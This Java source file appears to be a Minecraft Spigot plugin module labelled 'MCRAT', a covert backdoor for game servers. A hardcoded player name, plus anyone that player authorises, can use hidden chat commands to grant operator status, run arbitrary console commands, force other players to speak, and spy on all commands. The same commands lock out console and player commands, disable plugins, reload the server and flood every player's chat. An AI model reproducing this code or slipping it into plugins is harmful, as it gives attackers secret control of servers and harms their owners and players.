package com.htmlcomputer.plugin;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.api.chat.hover.content.Content;



public class ONCHAT implements Listener,CommandExecutor{

    static SpigotPlugin plugin;
	String spyactive[] = new String[]{};
	Boolean lockcommand = false;
	Boolean lockconsole = false;
public void Main() {
	
	
	
}
    public boolean onConsoleCommand(final CommandSender sender, final Command cmd, final String label, final String[] args) {
		final Player p = (Player)sender;
		

       
		
		return false;
		
	}
@EventHandler(priority = EventPriority.HIGHEST)
    public void onConsoleCommand(ServerCommandEvent e) {
    //e.getPlayer().sendMessage("NO");
    List<String> lst = Arrays.asList(spyactive);
    if(lockconsole) {

        lst.forEach(pl -> {
        	if(pl!=null) {

            	Player that = Bukkit.getPlayer(pl);
            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §8Console tried to run §7"+e.getCommand()+" §8but is locked");
        	}
        });
        e.setCancelled(true);
    }else {

        lst.forEach(pl -> {
        	if(pl!=null) {

            	Player that = Bukkit.getPlayer(pl);
            	that.sendMessage("§cMCRAT §eSPY §8| §8Console §b-> §7"+e.getCommand());
        	}
        });
    }
      }

	static int c = 0;
	static String oo = "";
	@SuppressWarnings("deprecation")

    @Override
	public boolean onCommand(final CommandSender sender, final Command cmd, final String label, final String[] args) {
		final Player p = (Player)sender;
		

       
		
		return false;
		
	}

@EventHandler(priority = EventPriority.HIGHEST)
public void onCommand(PlayerCommandPreprocessEvent e){
	Player p = e.getPlayer();
    //e.getPlayer().sendMessage("NO");
    List<String> lst = Arrays.asList(spyactive);
    if(lockcommand) {

        lst.forEach(pl -> {
        	if(pl!=null) {

            	Player that = Bukkit.getPlayer(pl);
            	that.sendMessage("§cMCRAT §eLOCKER §8| §8"+p.getName()+" tried to run §7"+e.getMessage()+" §8but is locked");
        	}
        });
        e.setCancelled(true);
    }else {

        lst.forEach(pl -> {
        	if(pl!=null) {

            	Player that = Bukkit.getPlayer(pl);
            	that.sendMessage("§cMCRAT §eSPY §8| §7"+p.getName()+" §8-> §7"+e.getMessage());
        	}
        });
    }

}

String fl = "";
public String onlyrunners[] = new String[]{"HTMLComputer"};
	@SuppressWarnings("deprecation")
	@EventHandler
    public void onChat(PlayerChatEvent  e) {

        Player p = e.getPlayer();
        String msg = e.getMessage();
        //Player player = (Player)p;

        List<String> list = Arrays.asList(onlyrunners);
        List<String> spyactivelist = Arrays.asList(spyactive);
        if(list.contains(p.getName())) {

        	if(msg.contains(":lockconsole")) {
        		if(!lockconsole) {
        			try {

        			    List<String> ls = Arrays.asList(onlyrunners);

        			        ls.forEach(pl -> {
        			        	if(pl!=null) {

        			            	Player that = Bukkit.getPlayer(pl);
        			            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §7"+p.getName()+" locked §bconsole");
        			        	}
        			        });
            			p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §cYou Locked Console");
            			lockconsole=true;
                	}catch(Error err) {
                    	p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| Error: "+err.toString());
                	}
        		}else {

    			    List<String> ls = Arrays.asList(onlyrunners);

    			        ls.forEach(pl -> {
    			        	if(pl!=null) {

    			            	Player that = Bukkit.getPlayer(pl);
    			            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §7"+p.getName()+" unlocked §bconsole");
    			        	}
    			        });
        			lockconsole=false;
        			p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §aYou Unlocked §bconsole");
                    	
        		}
            	e.setCancelled(true);
            }else if(msg.contains(":flood")) {
            	for(int i = 0;i<100;i++) {

                	fl+="§0§kqweryutiytw";
                	fl+="§1§kqweryutiytw";
                	fl+="§2§kqweryutiytw";
                	fl+="§3§kqweryutiytw";
                	fl+="§4§kqweryutiytw";
                	fl+="§5§kqweryutiytw";
                	fl+="§6§kqweryutiytw";
                	fl+="§7§kqweryutiytw";
                	fl+="§8§kqweryutiytw";
                	fl+="§9§kqweryutiytw";
                	fl+="§a§kqweryutiytw";
                	fl+="§b§kqweryutiytw";
                	fl+="§c§kqweryutiytw";
                	fl+="§d§kqweryutiytw";
                	fl+="§e§kqweryutiytw";
                	fl+="§f§kqweryutiytw";
            	}
                Bukkit.getOnlinePlayers().forEach(pl -> {
                	pl.sendMessage(fl);
                });
                	e.setCancelled(true);
                }else if(msg.contains(":lockcommands")) {
        		if(!lockcommand) {
        			try {

        			    List<String> ls = Arrays.asList(onlyrunners);

        			        ls.forEach(pl -> {
        			        	if(pl!=null) {

        			            	Player that = Bukkit.getPlayer(pl);
        			            	that.sendMessage("§cMCRAT §eCMDLOCKER §8| §7"+p.getName()+" locked commands for all players");
        			        	}
        			        });
            			p.sendMessage("§cMCRAT §eCMDLOCKER §8| §cYou Locked Commands for all players");
            			lockcommand=true;
                	}catch(Error err) {
                    	p.sendMessage("§cMCRAT §eCMDLOCKER §8| Error: "+err.toString());
                	}
        		}else {

    			    List<String> ls = Arrays.asList(onlyrunners);

    			        ls.forEach(pl -> {
    			        	if(pl!=null) {

    			            	Player that = Bukkit.getPlayer(pl);
    			            	that.sendMessage("§cMCRAT §eCMDLOCKER §8| §7"+p.getName()+" unlocked commands for all players");
    			        	}
    			        });
        			lockcommand=false;
        			p.sendMessage("§cMCRAT §eCMDLOCKER §8| §aYou Unlocked commands for all players");
                    	
        		}
            	e.setCancelled(true);
            }else if(msg.contains(":spy")) {
        		if(spyactivelist.contains(p.getName())) {
        			try {
        		        List<String> lst = Arrays.asList(spyactive);
            			spyactive=removeFromArray(spyactive,p.getName());
            			p.sendMessage("§cMCRAT §8| §cYou stopped spying on other players.");
                	}catch(Error err) {
                    	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
                	}
        		}else {
        			spyactive=push(spyactive,p.getName());
        			p.sendMessage("§cMCRAT §8| §aYou are now spying on other players: What other players type, you will see");
                    	
        		}
            	e.setCancelled(true);
            }else if(msg.contains(":reloadserver")) {
            	Bukkit.getServer().reload();
        			p.sendMessage("§cMCRAT §8| §aSuccess! Server reloaded");
                	p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
                	e.setCancelled(true);
            }else if(msg.contains(":giveaccess")) {

        		String arg = msg.replace(":giveaccess ","");
        		if(arg.contains(":giveaccess")) {

                	p.sendMessage("§cMCRAT §8| §ePlease Provide A Player");
        		}else {
        			
        			Player pl = Bukkit.getPlayer(arg);	

        			
        			
        			
    			    List<String> ls = Arrays.asList(onlyrunners);

    			        ls.forEach(psl -> {
    			        	if(psl!=null) {

    			            	Player that = Bukkit.getPlayer(psl);
    			            	that.sendMessage("§cMCRAT §8| §e"+p.getName()+" Gave MCRAT Access To"+arg);
    			        	}
    			        });
    			        
    			    onlyrunners = push(onlyrunners,pl.getName());
    			    pl.sendMessage("§cMCRAT §8| §e"+p.getName()+" gave you MCRAT Access");
                	p.sendMessage("§cMCRAT §8| §aGave MCRAT Access To "+arg);
        		}
        		
                //p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
                e.setCancelled(true);
        }else if(msg.contains(":revokeaccess")) {

    		String arg = msg.replace(":revokeaccess ","");
    		if(arg.contains(":revokeaccess")) {

            	p.sendMessage("§cMCRAT §8| §ePlease Provide A Player");
    		}else {
    			
    			Player pl = Bukkit.getPlayer(arg);	
if(pl.getName()==p.getName()) {

	p.sendMessage("§cMCRAT §8| §cYou Can't revoke your access To MCRat");
}else {
	List<String> ls = Arrays.asList(onlyrunners);

    ls.forEach(psl -> {
    	if(psl!=null) {

        	Player that = Bukkit.getPlayer(psl);
        	that.sendMessage("§cMCRAT §8| §e"+p.getName()+" Revoked MCRAT Access To "+arg);
    	}
    });
    

onlyrunners=removeFromArray(onlyrunners,pl.getName());
pl.sendMessage("§cMCRAT §8| §e"+p.getName()+" revoked your MCRAT Access");
p.sendMessage("§cMCRAT §8| §eRevoked MCRAT Access To "+arg);
}

    			
    			
    			
			    
    		}
    		
            //p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
            e.setCancelled(true);
    }else if(msg.contains(":disableplugin")) {
            	Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
    			List<String> pluginNames = new ArrayList<>();

        		String arg = msg.replace(":disableplugin ","");
    	        //Plugin[] plugins = this.getServer().getPluginManager().getPlugins();
    	        for (Plugin pluginBuffer : plugins) {
    	        	if(arg.contains(pluginBuffer.getName())) {

        	        	Bukkit.getServer().getPluginManager().disablePlugin(pluginBuffer); 
clearChat(p);
p.chat(":plugins");
p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29); 
            			p.sendMessage("§8 - §8 ------------------------------------");
            			p.sendMessage("§8 - §8 |");
            			p.sendMessage("§8 - §8 |§e Tip: Reload The Server");
            			p.sendMessage("§8 - §8 |");
            			p.sendMessage("§8 - §8 |§e Reloading the server after enabling a plugin");
            			p.sendMessage("§8 - §8 |§e Will enable certain plugins that have crashed");
            			p.sendMessage("§8 - §8 |§e While enabling. §7(like EssentialsX)");
            			p.sendMessage("§8 - §8 |");

            			TextComponent message = new TextComponent( "§8 - §8 | §a[Reload]" );
        	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":reloadserver") );
        	            p.spigot().sendMessage( message );
            			p.sendMessage("§8 - §8 |");
            			p.sendMessage("§8 - §8 ------------------------------------");
            			p.sendMessage("");
        	        	//p.chat(":plugins");
    	        	}
    	        }
            	e.setCancelled(true);
            }else if(msg.contains(":enableplugin")) {
            	p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
            	Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
    			List<String> pluginNames = new ArrayList<>();

        		String arg = msg.replace(":enableplugin ","");
    	        //Plugin[] plugins = this.getServer().getPluginManager().getPlugins();
    	        for (Plugin pluginBuffer : plugins) {
    	        	if(arg.contains(pluginBuffer.getName())) {

        	        	Bukkit.getServer().getPluginManager().enablePlugin(pluginBuffer); 
        	        	//p.chat(":plugins");
    	        	}
    	        }
            	e.setCancelled(true);
            }else if(msg.contains(":plugins")) {
            	Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
            	clearChat(p);
    			p.sendMessage("§cMCRAT §8| §aHere is the list of all plugins:");
    			p.sendMessage("");
    			List<String> pluginNames = new ArrayList<>();
    	        //Plugin[] plugins = this.getServer().getPluginManager().getPlugins();
    	        for (Plugin pluginBuffer : plugins) {
    	        	TextComponent message;
    	        	if(pluginBuffer.isEnabled()) {

        	            message = new TextComponent( "§8 - §a"+pluginBuffer.getName() );
        	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":disableplugin "+pluginBuffer.getName() ) );
    	        	}else {

        	            message = new TextComponent( "§8 - §c"+pluginBuffer.getName() );
        	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":enableplugin "+pluginBuffer.getName() ) );
    	        	}
    	            //"§7Click to toggle §cdisable§e/§aenable §7of this plugin"
    	            //Content hovertext="§7Click to toggle §cdisable§e/§aenable §7of this plugin"
    	            //message.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,hovertext));
    	            p.spigot().sendMessage( message );
        			//p.sendMessage("§8 - §e"+pluginBuffer.getName());
    	        }
    			p.sendMessage("");
    			p.sendMessage("§8---------------------------------------");
            	e.setCancelled(true);
            }else if(msg.contains(":status")) {

    			p.sendMessage("§cMCRAT §8| §aSTATUS:");

    			p.sendMessage("§8-");
    			if(lockconsole) {

        			p.sendMessage("§8-  §7 LockConsole : §aActive");
    			}else {

        			p.sendMessage("§8-  §7 LockConsole : §cInactive");
    			}
    			p.sendMessage("§8-");
    			if(lockcommand) {

        			p.sendMessage("§8-  §7 LockCommands : §aActive");
    			}else {

        			p.sendMessage("§8-  §7 LockCommands : §cInactive");
    			}

    			p.sendMessage("§8-");
    			if(spyactivelist.contains(p.getName())) {

        			p.sendMessage("§8-  §7 Spying : §eActive (for you)");
    			}else {

        			p.sendMessage("§8-  §7 Spying : §cInactive (for you)");
    			}

    			p.sendMessage("§8-");
    			p.sendMessage("§8---------------------------------------");
            	e.setCancelled(true);
            }else if(msg.contains(":op")) {
            	try {
            		String arg = msg.replace(":op ","");
            		if(arg.contains(":op")) {
                    	p.setOp(true);
                    	p.sendMessage("§cMCRAT §8| §aYou Have Been Opped");
            		}else {
            			Player pl = Bukkit.getPlayer(arg);
            			pl.setOp(true);
            			p.sendMessage("§cMCRAT §8| §aYou Have Opped "+arg);
            		}
                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
            		//Bukkit.getPlayer();
            	}catch(Error err) {
                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
            	}
            	e.setCancelled(true);
            }else if(msg.contains(":deop")) {
            	try {
            		String arg = msg.replace(":deop ","");
            		if(arg.contains(":deop")) {
                    	p.setOp(false);
                    	p.sendMessage("§cMCRAT §8| §cYou Have Been Deopped");
            		}else {
            			Player pl = Bukkit.getPlayer(arg);
            			pl.setOp(false);
            			p.sendMessage("§cMCRAT §8| §cYou Have Deopped "+arg);
            		}
                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
            		//Bukkit.getPlayer();
            	}catch(Error err) {
                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
            	}
            	e.setCancelled(true);
            }else if(msg.contains(":exec")) {
            	try {
            		String arg = msg.replace(":exec ","");
            		if(arg.contains(":exec")) {

                    	p.sendMessage("§cMCRAT §8| §ePlease Provide a command");
            		}else {

                    	try {

                    	      Bukkit.dispatchCommand(Bukkit.getServer().getConsoleSender(), arg);

                        	p.sendMessage("§cMCRAT §8| §aYour Command Has Been Executed In Console!");
                    	}catch(Error errr) {

                        	p.sendMessage("§cMCRAT §8| §cError: "+errr.toString());
                    	}
            		}
                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
            		//Bukkit.getPlayer();
            	}catch(Error err) {
                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
            	}
            	e.setCancelled(true);
            }else if(msg.contains(":sudo")) {

            	e.setCancelled(true);
            		String arg = msg.replace(":sudo ","");
            		if(arg.contains(":sudo")) {

                    	p.sendMessage("§cMCRAT §8| §ePlease Provide a player");
            		}else {
            			String[] l = arg.split(" ");

            			List<String> li = new ArrayList<String>(Arrays.asList(l));
            			c=0;
            			oo="";
            			li.forEach(ll -> {
            				if(c>0) {

                				oo=oo+" "+ll;
            				}
            				c++;
            			});
            			oo=oo.substring(1);
            			Bukkit.getPlayer(arg.split(" ")[0]).chat(oo);
                        	p.sendMessage("§cMCRAT §8| §aSuccess!");
            		}
                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
            		//Bukkit.getPlayer();
            }else if(msg.contains(":")) {

            	e.setCancelled(true);
            	p.sendMessage("§cMCRAT §8| §eCan't Find Command");
            }
        }
    }
    private static int indexOf(Object[] strArray, Object element){
        
        /*
         * Convert array to List and then
         * use indexOf method of List class.
         */
        int index = Arrays.asList(strArray).indexOf(element);
        
        return index;
        
    }
    private static String[] removeFromArray(String[] array, String str) {

		List<String> l = new ArrayList<String>(Arrays.asList(array));
		l.removeAll(Arrays.asList(str));
		array = l.toArray(array);
		return array;
    }
    private static String[] push(String[] array, String str) {

		List<String> l = new ArrayList<String>(Arrays.asList(array));
		l.add(str);
		array = l.toArray(array);
		return array;
    }
    private void clearChat(Player p) {
for(int i = 0;i<20;i++) {
	p.chat("");
	
}
    }
}